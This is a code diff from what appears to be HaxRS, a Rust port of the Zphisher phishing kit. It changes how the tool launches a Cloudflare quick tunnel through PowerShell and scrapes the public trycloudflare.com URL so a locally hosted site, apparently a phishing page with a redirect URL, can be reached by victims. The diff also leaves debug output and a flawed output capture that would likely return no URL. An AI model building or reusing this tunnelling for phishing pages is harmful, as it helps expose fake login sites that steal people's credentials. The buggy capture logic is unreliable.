@@ -1,24 +1,25 @@
 use crate::cli::{clear_terminal, error_msg, log_msg};
 use crate::constants::*;
-use crate::helpers::{files_exist, get_data_dir, get_download_urls, get_server_dir, get_sites_dir};
+use crate::helpers::{files_exist, get_cloudflare_file, get_data_dir, get_download_urls, get_server_dir, get_sites_dir};
 
 use colored::Colorize;
-use std::env;
+use std::{env, thread};
 
 use std::fs;
 use std::path::{Path, PathBuf};
-use std::process::{exit, Command};
+use std::process::{exit, Command, Stdio};
 
 use reqwest::Url;
 use std::fs::{File, OpenOptions, remove_file};
-use std::io::{BufRead, BufReader, stdin, stdout, Write};
-#[cfg(target_os = "windows")] use std::thread::sleep;
-#[cfg(target_os = "windows")] use std::time::Duration;
-use zip::read::ZipFile;
-use zip::ZipArchive;
+use std::io::{Error, ErrorKind, stdin, stdout, Write};
+use futures::try_join;
+//#[cfg(target_os = "windows")] use std::thread::sleep;
+// #[cfg(target_os = "windows")] use std::time::Duration; use zip::read::ZipFile; use zip::ZipArchive;
 use rayon::prelude::*;
 use regex::Regex;
 use reqwest::header::USER_AGENT;
+use zip::read::ZipFile;
+use zip::ZipArchive;
 use crate::errors::TerminalError;
 use crate::web_server::start_webserver;
 
@@ -99,7 +100,7 @@ pub fn banner_small() {
     println!("{}", BANNER.cyan());
     println!("HaxRS Version: {}", VERSION.bold());
     println!("Zphisher Version: {}", ZPHISHER_VERSION.bold());
-println!("{} {}", "Created by:".dimmed(), "Skyline".dimmed().bold());
+    println!("{} {}", "Created by:".dimmed(), "Skyline".dimmed().bold());
     println!();
 }
 
@@ -492,16 +493,6 @@ pub fn get_input_number(msg: &str) -> Result<u32, TerminalError> {
     }
 }
 
-/*
-pub fn get_input_string(msg: &str) -> Result<String, TerminalError> {
-    print!("{}", msg);
-    stdout().flush()?;
-    let mut input = String::new();
-    stdin().read_line(&mut input)?;
-    Ok(input.trim().to_string())
-}
-*/
-
 pub async fn tunnel_selection(site: &str, redirect_url: String) -> Result<(), TerminalError> {
     loop {
         let selection: u32 = get_input_number("Select a tunnel: ")?;
@@ -538,33 +529,41 @@ pub async fn setup_site(site: &str, port: Option<u16>, redirect_url: String) -> 
     Ok(())
 }
 
-fn get_cldflr_url() -> Result<String, TerminalError> {
-    let log_file_path = match get_server_dir() {
-        Some(s) => s,
-        None => {
-            log::error!("Failed to get server directory");
-            error_msg("Failed to get server directory");
-            return Err("Failed to get server directory".into());
-        }
-    }.join(".cld.log");
-    let file = BufReader::new(File::open(&log_file_path)?);
-    let url_regex = match Regex::new(r"https://[-0-9a-z]*\.trycloudflare\.com") {
-        Ok(r) => r,
-        Err(e) => {
-            log::error!("Failed to create regex: {}", e);
-            error_msg(&format!("Failed to create regex: {}", e));
-            return Err("Failed to create regex".into());
-        }
-    };
-    for line in file.lines() {
-        let line = line?;
-        if let Some(captures) = url_regex.captures(&line) {
+
+fn get_cldflr_url(cus_port: Option<u16>) -> Result<String, TerminalError> {
+    dbg!("start");
+
+    let output = Command::new("powershell")
+        .arg("-Command")
+        .arg(get_cloudflare_file())
+        .arg("tunnel")
+        .arg("--url")
+        .arg(format!("http://{}:{}", HOST, cus_port.unwrap_or(PORT)))
+        .arg("--logfile")
+        .arg(".cld.log")
+        .arg("--http2-origin")
+        .stdout(Stdio::null())
+        .stderr(Stdio::inherit())
+        .spawn()
+        .expect("Failed to start cloudflared");
+
+    let raw_output = output.wait_with_output()?;
+    let output = String::from_utf8_lossy(&raw_output.stderr);
+    dbg!(&output);
+
+    let url_regex = Regex::new(r"https://[-0-9a-z]*\.trycloudflare.com").unwrap();
+
+    for line in output.lines() {
+        if let Some(captures) = url_regex.captures(line) {
             return Ok(captures[0].to_string());
         }
     }
+    dbg!(&output);
 
     Err("URL not found".into())
 }
+
+
 
 
 pub async fn start_cloudflared(site: &str, redirect_url: String) -> Result<(), TerminalError> {
@@ -589,17 +588,48 @@ pub async fn start_cloudflared(site: &str, redirect_url: String) -> Result<(), T
         }
     }
     let cus_port: Option<u16> = custom_port_input()?;
+    // start setup site with the scope down below at the same time
+
+
+    thread::spawn(move || {
+        println!("{}",get_cldflr_url(cus_port).unwrap_or_else(|e| {
+            log::error!("Failed to get cloudflared URL: {}", e);
+            error_msg(&format!("Failed to get cloudflared URL: {}", e));
+            exit(1);
+        }));
+    });
     setup_site(site, cus_port, redirect_url).await?;
 
+    /*
     #[cfg(target_os = "windows")]
+    thread::spawn(move ||
     {
-        let mut cmd = Command::new("cmd");
-        cmd.arg("/c").arg("cloudflared").arg("tunnel").arg("run").arg("--url").arg(format!("http://{}:{}", HOST, cus_port.unwrap_or(PORT))).arg("--logfile").arg(".cld.log");
-        cmd.spawn()?;
-        sleep(Duration::from_secs(8));
-        let url = get_cldflr_url()?;
+        let mut cmd = Command::new("powershell");
+        cmd.arg("/c").arg(get_cloudflare_file()).arg("tunnel")
+            .arg("--url")
+            .arg(format!("http://{}:{}", HOST, cus_port.unwrap_or(PORT)))
+            .arg("--logfile")
+            .arg(".cld.log")
+            .arg("--http2-origin")
+            .stdout(Stdio::null())
+            .stderr(Stdio::null())
+        ;
+        cmd.spawn().unwrap_or_else(|_| {
+            log::error!("Failed to start cloudflared");
+            error_msg("Failed to start cloudflared");
+            exit(1);
+        });
+        dbg!(&cmd);
+        let url = get_cldflr_url().unwrap_or_else(|e| {
+            log::error!("Failed to get cloudflared URL: {}", e);
+            error_msg(&format!("Failed to get cloudflared URL: {}", e));
+            exit(1);
+        });
         println!("{} {}", "Cloudflared URL:".green(), url.cyan());
-    }
+    } );
+    */
+
+    // #[cfg(target_os = "windows")] setup_site(site, cus_port, redirect_url).await?;
     #[cfg(not(target_os = "windows"))]
     {
         use std::env::consts::ARCH;
@@ -615,6 +645,7 @@ pub async fn start_cloudflared(site: &str, redirect_url: String) -> Result<(), T
         let mut cmd = Command::new(cloudflare_file);
         cmd.arg("tunnel").arg("run").arg("--url").arg(format!("http://{}:{}", HOST, cus_port.unwrap_or(PORT))).arg("--logfile").arg(".cld.log");
     }
+
     Ok(())
 }
 
